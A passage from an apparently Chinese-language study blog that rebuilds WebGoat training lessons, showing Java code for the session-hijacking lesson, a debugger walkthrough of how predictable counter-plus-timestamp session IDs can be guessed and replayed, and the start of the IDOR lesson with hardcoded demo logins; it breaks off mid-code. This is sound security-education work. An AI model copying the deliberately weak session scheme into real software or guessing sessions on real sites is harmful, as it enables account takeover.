class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="HijackSessionAssignment"><a href="#HijackSessionAssignment" class="headerlink" title="HijackSessionAssignment"></a>HijackSessionAssignment</h3><p>这里说明一下这里的顺序其实是代表着书写的顺序 如果需要去阅读的话建议从后向前读更好理解 或者先写一遍 然后理解</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.hijacksession;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentHints;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.lessons.hijacksession.cas.Authentication;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.lessons.hijacksession.cas.HijackSessionAuthenticationProvider;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.lang3.StringUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.Cookie;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@AssignmentHints(&#123;</span></span><br><span class="line"><span class="meta">        &quot;hijacksession.hints.1&quot;,</span></span><br><span class="line"><span class="meta">        &quot;hijacksession.hints.2&quot;,</span></span><br><span class="line"><span class="meta">        &quot;hijacksession.hints.3&quot;,</span></span><br><span class="line"><span class="meta">        &quot;hijacksession.hints.4&quot;,</span></span><br><span class="line"><span class="meta">        &quot;hijacksession.hints.5&quot;,</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HijackSessionAssignment</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">COOKIE_NAME</span> <span class="operator">=</span> <span class="string">&quot;hijack_cookie&quot;</span>;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    HijackSessionAuthenticationProvider provider;</span><br><span class="line"><span class="comment">//    这里自动注入了</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(path = &quot;/HijackSession/login&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">login</span><span class="params">(<span class="meta">@RequestParam</span> String username, <span class="meta">@RequestParam</span> String password,</span></span><br><span class="line"><span class="params">                              <span class="meta">@CookieValue(value = COOKIE_NAME,required = false)</span> String cookieValue,</span></span><br><span class="line"><span class="params">                              HttpServletResponse response)</span>&#123;</span><br><span class="line">        Authentication authentication;</span><br><span class="line"><span class="comment">//        定义authentication对象</span></span><br><span class="line">        <span class="keyword">if</span> (StringUtils.isEmpty(cookieValue))&#123;</span><br><span class="line"><span class="comment">//            如果cookieValue是空的</span></span><br><span class="line">            authentication = provider.authenticate(Authentication.builder().name(username).credentials(password).build());</span><br><span class="line">            setCookie(response,authentication.getId());</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            authentication = provider.authenticate(Authentication.builder().id(cookieValue).build());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (authentication.isAuthenticated())&#123;</span><br><span class="line"><span class="comment">//            如果已经认证了</span></span><br><span class="line">            <span class="keyword">return</span> success(<span class="built_in">this</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> failed(<span class="built_in">this</span>).build();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">setCookie</span><span class="params">(HttpServletResponse response,String cookieValue)</span>&#123;</span><br><span class="line">        <span class="type">Cookie</span> <span class="variable">cookie</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cookie</span>(COOKIE_NAME,cookieValue);</span><br><span class="line">        cookie.setPath(<span class="string">&quot;/WebGoat&quot;</span>);</span><br><span class="line">        cookie.setSecure(<span class="literal">true</span>);</span><br><span class="line">        response.addCookie(cookie);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="cas"><a href="#cas" class="headerlink" title="cas"></a>cas</h3><h4 id="HijackSessionAuthenticationProvider"><a href="#HijackSessionAuthenticationProvider" class="headerlink" title="HijackSessionAuthenticationProvider"></a>HijackSessionAuthenticationProvider</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.hijacksession.cas;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.lang3.StringUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.annotation.ApplicationScope;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.time.Instant;</span><br><span class="line"><span class="keyword">import</span> java.util.LinkedList;</span><br><span class="line"><span class="keyword">import</span> java.util.Queue;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.ThreadLocalRandom;</span><br><span class="line"><span class="keyword">import</span> java.util.function.DoublePredicate;</span><br><span class="line"><span class="keyword">import</span> java.util.function.Supplier;</span><br><span class="line"></span><br><span class="line"><span class="meta">@ApplicationScope</span></span><br><span class="line"><span class="comment">//没太读懂 这里是指这个类与@Bean类注解的相似 但是会将作用域放到SCOPE_APPLICATION里面?</span></span><br><span class="line"><span class="comment">//我理解就是用springboot自动去加载管理只不过作用域不同</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HijackSessionAuthenticationProvider</span> <span class="keyword">implements</span> <span class="title class_">AuthenticationProvider</span>&lt;Authentication&gt; &#123;</span><br><span class="line"><span class="comment">//    这里也很简单就可以理解 首先实现的是AuthenticationProvider 而这里的Authentication 就相当于实参去传递给了T</span></span><br><span class="line">    <span class="keyword">private</span> Queue&lt;String&gt; sessions = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line"><span class="comment">//    用于在处理之前保存元素的集合</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">long</span> <span class="variable">id</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>().nextLong() &amp; Long.MAX_VALUE;</span><br><span class="line"><span class="comment">//    这里其实不太能理解 前面是生成一个long类型的随机数 这个 &amp; 是什么意思 表表示最大是 Long.MAX_VALUE?</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">MAX_SESSIONS</span> <span class="operator">=</span> <span class="number">50</span> ;</span><br><span class="line"><span class="comment">//    这里其实是作为session 最大值的一个定义</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">DoublePredicate</span> <span class="variable">PROBABILITY_DOUBLE_PREDICATE</span> <span class="operator">=</span> pr -&gt; pr &lt; <span class="number">0.75</span>;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Supplier&lt;String&gt; GENERATE_SESSION_ID = () -&gt; ++id + <span class="string">&quot;-&quot;</span> + Instant.now().toEpochMilli();</span><br><span class="line"><span class="comment">//    这里简单理解就是 id先自加一 再拼接起当前时间戳</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Supplier&lt;Authentication&gt; AUTHENTICATION_SUPPLIER = () -&gt; Authentication</span><br><span class="line">            .builder()</span><br><span class="line">            .id(GENERATE_SESSION_ID.get())</span><br><span class="line"><span class="comment">//        get()获取结果的提供者 就是获取Authentication创建的时间</span></span><br><span class="line">            .build();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Authentication <span class="title function_">authenticate</span><span class="params">(Authentication authentication)</span> &#123;</span><br><span class="line"><span class="comment">//        进行认证</span></span><br><span class="line">        <span class="keyword">if</span> (authentication == <span class="literal">null</span>)&#123;</span><br><span class="line"><span class="comment">//            如果没有authentication 则返回一个</span></span><br><span class="line">            <span class="keyword">return</span> AUTHENTICATION_SUPPLIER.get();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (StringUtils.isNotEmpty(authentication.getId()) &amp;&amp; sessions.contains(authentication.getId())) &#123;</span><br><span class="line"><span class="comment">//      如果id不是空 并且 sessions 包含id</span></span><br><span class="line">            authentication.setAuthenticated(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//            认证成功</span></span><br><span class="line">            <span class="keyword">return</span> authentication;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (StringUtils.isEmpty(authentication.getId()))&#123;</span><br><span class="line"><span class="comment">//            如果id是空</span></span><br><span class="line">            authentication.setId(GENERATE_SESSION_ID.get());</span><br><span class="line"><span class="comment">//            救赋值</span></span><br><span class="line">        &#125;</span><br><span class="line">        authorizedUserAutoLogin();</span><br><span class="line"><span class="comment">//        认证的用户自动登录</span></span><br><span class="line">        <span class="keyword">return</span> authentication;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span>  <span class="title function_">authorizedUserAutoLogin</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!PROBABILITY_DOUBLE_PREDICATE.test(ThreadLocalRandom.current().nextDouble()))&#123;</span><br><span class="line"><span class="comment">//            生成一个随机 数判断与 0.75 大小   如果大于0.75</span></span><br><span class="line">            <span class="type">Authentication</span> <span class="variable">authentication</span> <span class="operator">=</span> AUTHENTICATION_SUPPLIER.get();</span><br><span class="line">            authentication.setAuthenticated(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//            设置成已认证</span></span><br><span class="line">            addSession(authentication.getId());</span><br><span class="line"><span class="comment">//            添加一个session  为id</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">protected</span> <span class="type">boolean</span> <span class="title function_">addSession</span><span class="params">(String sessionId)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (sessions.size() &gt;= MAX_SESSIONS) &#123;</span><br><span class="line">            sessions.remove();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sessions.add(sessionId);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">protected</span> <span class="type">int</span> <span class="title function_">getSessionsSize</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> sessions.size();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="Authentication"><a href="#Authentication" class="headerlink" title="Authentication"></a>Authentication</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.hijacksession.cas;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.Builder;</span><br><span class="line"><span class="keyword">import</span> lombok.Getter;</span><br><span class="line"><span class="keyword">import</span> lombok.ToString;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.security.Principal;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Getter</span></span><br><span class="line"><span class="meta">@ToString</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Authentication</span> <span class="keyword">implements</span> <span class="title class_">Principal</span> &#123;</span><br><span class="line"><span class="comment">//    这里很明显继承了 Principal 那么应该是 AuthenticationProvider中的 T参数了</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="variable">authenticated</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> Object credentials;</span><br><span class="line">    <span class="keyword">private</span> String id;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Builder</span></span><br><span class="line"><span class="comment">//    可进行链式赋值</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Authentication</span><span class="params">(<span class="type">boolean</span> authenticated, String name, Object credentials, String id)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.credentials = credentials;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="keyword">void</span> <span class="title function_">setAuthenticated</span><span class="params">(<span class="type">boolean</span> authenticated)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.authenticated = authenticated;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">setId</span><span class="params">(String id)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="AuthenticationProvider"><a href="#AuthenticationProvider" class="headerlink" title="AuthenticationProvider"></a>AuthenticationProvider</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.hijacksession.cas;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.security.Principal;</span><br><span class="line"></span><br><span class="line"><span class="meta">@FunctionalInterface</span></span><br><span class="line"><span class="comment">//简单来说就是这个是标记是否符合接口的定义 这个接口必须只有一个抽象方法 目的是为了方便Lambda表达式</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">AuthenticationProvider</span> &lt;T <span class="keyword">extends</span> <span class="title class_">Principal</span> &gt;&#123;</span><br><span class="line"><span class="comment">//    这里其实不太能理解 推测并不是代表这个类去继承Principal 而是代表的这个T 参数是继承于Principal 但是写在了类上面造成了误解</span></span><br><span class="line"><span class="comment">//    其实可以把这里的T 理解成形参 实参在HijackSessionAuthenticationProvider传入</span></span><br><span class="line">    T <span class="title function_">authenticate</span><span class="params">(T t)</span>;</span><br><span class="line"><span class="comment">//    那么这里自然这个 t 参数类型就是代表着 必须继承自Principal</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>简单分析一下</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220827203154209.png" alt="image-20220827203154209"></p>
<p>当第一次请求的时候cookie其实是空的</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220827203533200.png" alt="image-20220827203533200"></p>
<p>先创建一个username 和 passwd 的authentication</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220827203719088.png" alt="image-20220827203719088"></p>
<p>这里两个false  直接跳到下一个if里面 </p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220828133534770.png" alt="image-20220828133534770"></p>
<p>调用的 GENERATE_SESSION_ID 去获取一个id </p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220828133632268.png" alt="image-20220828133632268"></p>
<p>这里的id 首先是一个静态的值 紧接着去自加一 与 当前时间戳进行拼接</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220828134048342.png" alt="image-20220828134048342"></p>
<p>这里需要注意的是 这里的 authentication 是这个 @23160 还有这个id 最后是657</p>
<p>紧接着跳到了authorizedUserAutoLogin()中去</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220827203818440.png" alt="image-20220827203818440"></p>
<p>仔细看着一行 其实 这里是有一定概率才能进到这个if中的,原因就是这里的 数字是随机生成的 进入if的概率呢就是 0.25</p>
<p>因此我们在if里面下个断点然后不断重复请求进入if看看先</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220828134226576.png" alt="image-20220828134226576"></p>
<p>进来以后发现创建了一个 使用的是 AUTHENTICATION_SUPPLIER.get()创建了一个新的authentication </p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220828133124860.png" alt="image-20220828133124860"></p>
<p>因此就调到了这里面这里很明显示构建一个Authentication 但是这里的 id 其实是调用的 GENERATE_SESSION_ID 首先这里进行了id的自加一 </p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220828133255565.png" alt="image-20220828133255565"></p>
<p>这里的id其实是静态的 因此 先自加后拼接当前时间戳</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220828134226576.png" alt="image-20220828134226576"></p>
<p>仔细看这里的 @23164 与 id 最后是236 这里其实出现了不同 那是由于我们下了断点导致执行时间出现了较大差异 假设我们不下断点的话 这两个值应该是相同的 我们可以做个简单的测试 后面会讲到</p>
<p>并将Authenticated赋值成了 true </p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220828134536803.png" alt="image-20220828134536803"></p>
<p>接着进行了addSession操作 将当前的 authentication.getId() 进行了存入</p>
<p>但是这里还需要注意的是如果sessions 的数量大于50 就会移除</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220828134625719.png" alt="image-20220828134625719"></p>
<p>接着返回了</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220828134710287.png" alt="image-20220828134710287"></p>
<p>回来之后的authentication是我们第一次的 @23160</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220828102713506.png" alt="image-20220828102713506"></p>
<p>接着将这里的setcookie</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220828134809977.png" alt="image-20220828134809977"></p>
<p>可以发现当cookie是空的时候会给请求设置一个cookie</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220828102747572.png" alt="image-20220828102747572"></p>
<p>从这里我们也可以测试一下设置cookie的规律</p>
<p>我们只在return 这里下一个断点 </p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220828135240545.png" alt="image-20220828135240545"></p>
<p>不断请求到截断到为止 这里发现后缀是235</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220828135408612.png" alt="image-20220828135408612"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220828135442335.png" alt="image-20220828135442335"></p>
<p>放行之后发现这里的后面时间戳其实是相同的 而只有前面由于自加一出现了差异</p>
<p>接着我们给cookie添加上去</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220827204845082.png" alt="image-20220827204845082"></p>
<p>这里由于sessions 中没有包含我们的cookie 因此两个都是false</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220827205205113.png" alt="image-20220827205205113"></p>
<p>这里当然也能进来 不过这次生成的cookie并不会返回到页面上面</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220828135916911.png" alt="image-20220828135916911"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220828140003139.png" alt="image-20220828140003139"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220828140028337.png" alt="image-20220828140028337"></p>
<p>到现在我们的思路就是先 使用 不带cookie的去请求获取得到的cookie 接着将得到的cookie 进行+1操作 因为实际存入到sessions中的其实是+过1的 接着使用这个cookie去请求</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220828140933908.png" alt="image-20220828140933908"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220828140941870.png" alt="image-20220828140941870"></p>
<h2 id="idor"><a href="#idor" class="headerlink" title="idor"></a>idor</h2><h3 id="IDOR"><a href="#IDOR" class="headerlink" title="IDOR"></a>IDOR</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.idor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Category;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Lesson;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IDOR</span> <span class="keyword">extends</span> <span class="title class_">Lesson</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Category <span class="title function_">getDefaultCategory</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Category.A1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getTitle</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;idor.title&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="IDORLogin"><a href="#IDORLogin" class="headerlink" title="IDORLogin"></a>IDORLogin</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.idor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentHints;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.session.UserSessionData;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@AssignmentHints(&#123;&quot;idor.hints.idor_login&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IDORLogin</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Map&lt;String,Map&lt;String,String &gt;&gt; idorUserInfo = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"><span class="comment">//    外面map用来存储用户  内部的map 用来存储用户的信息</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">initIDORInfo</span><span class="params">()</span>&#123;</span><br><span class="line">        idorUserInfo.put(<span class="string">&quot;tom&quot;</span>,<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, String&gt;());</span><br><span class="line">        idorUserInfo.get(<span class="string">&quot;tom&quot;</span>).put(<span class="string">&quot;password&quot;</span>,<span class="string">&quot;cat&quot;</span>);</span><br><span class="line">        idorUserInfo.get(<span class="string">&quot;tom&quot;</span>).put(<span class="string">&quot;id&quot;</span>,<span class="string">&quot;2342384&quot;</span>);</span><br><span class="line">        idorUserInfo.get(<span class="string">&quot;tom&quot;</span>).put(<span class="string">&quot;color&quot;</span>,<span class="string">&quot;yellow&quot;</span>);</span><br><span class="line">        idorUserInfo.get(<span class="string">&quot;tom&quot;</span>).put(<span class="string">&quot;size&quot;</span>,<span class="string">&quot;small&quot;</span>);</span><br><span class="line"></span><br><span class="line">        idorUserInfo.put(<span class="string">&quot;bill&quot;</span>,<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, String&gt;());</span><br><span class="line">        idorUserInfo.get(<span class="string">&quot;bill&quot;</span>).put(<span class="string">&quot;password&quot;</span>,<span class="string">&quot;buffalo&quot;</span>);</span><br><span class="line">        idorUserInfo.get(<span class="string">&quot;bill&quot;</span>).put(<span class="string">&quot;id&quot;</span>,<span class="string">&quot;2342388&quot;</span>);</span><br><span class="line">        idorUserInfo.get(<span class="string">&quot;bill&quot;</span>).put(<span class="string">&quot;color&quot;</span>,<span class="string">&quot;brown&quot;</span>);</span><br><span class="line">        idorUserInfo.get(<span class="string">&quot;bill&quot;</span>).put(<span class="string">&quot;size&quot;</span>,<span class="string">&quot;large&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/IDOR/login&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">completed</span><span class="params">(<span class="meta">@RequestParam</span> String username,<span class="meta">@RequestParam</span> String password)</span>&#123;</span><br><span class="line">        initIDORInfo();</span><br><span class="line"><span class="comment">//        先进行用户的初始化</span></span><br><span class="line">        <span class="type">UserSessionData</span> <span class="variable">userSessionData</span> <span class="operator">=</span> getUserSessionData();</span><br><span class="line">        <span class="keyword">if</span> (idorUserInfo.containsKey(username))&#123;</span><br><span class="line"><span class="comment">//            如果idorUserInfo包含这个用户</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&quot;tom&quot;</span>.equals(username) &amp;&amp; idorUserInfo.get(<span class="string">&quot;tom&quot;</span>).get(<span class="string">&quot;password&quot;</span>).equals(password))&#123;</span><br><span class="line">                userSessionData.setValue(<span class="string">&quot;idor-authenticated-as&quot;</span>,username);</span><br><span class="line">                userSessionData.setValue(<span class="string">&quot;idor-authenticated-user-id&quot;</span>,idorUserInfo.get(username).get(<span class="string">&quot;id&quot;</span>));</span><br><span class="line">                <span class="keyword">return</span> success(<span class="built_in">this</span>).feedback(<span class="string">&quot;idor.login.success&quot;</span>).feedbackArgs(username).build();</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;idor.login.failure&quot;</span>).build();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;idor.login.failure&quot;</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先看下UserSessionData</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220828154959520.png" alt="image-20220828154959520"></p>
<p>这里也比较简单就是 一个map的简单功能</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220828155228978.png" alt="image-20220828155228978"></p>
<p>这里只要登录就可过关了</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220828155303545.png" alt="image-20220828155303545"></p>
<h3 id="IDORDiffAttributes"><a href="#IDORDiffAttributes" class="headerlink" title="IDORDiffAttributes"></a>IDORDiffAttributes</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.idor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentHints;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.*;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@AssignmentHints(&#123;&quot;idor.hints.idorDiffAttributes1&quot;,&quot;idor.hints.idorDiffAttributes2&quot;,&quot;idor.hints.idorDiffAttributes3&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IDORDiffAttributes</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="meta">@PostMapping(&quot;/IDOR/diff-attributes&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">completed</span><span class="params">(<span class="meta">@RequestParam</span> String attributes)</span>&#123;</span><br><span class="line"><span class="comment">//        接收一个attributes参数</span></span><br><span class="line">        attributes = attributes.trim();</span><br><span class="line"><span class="comment">//        对参数进行前后去空</span></span><br><span class="line">        String[] diffAttribs = attributes.split(<span class="string">&quot;,&quot;</span>);</span><br><span 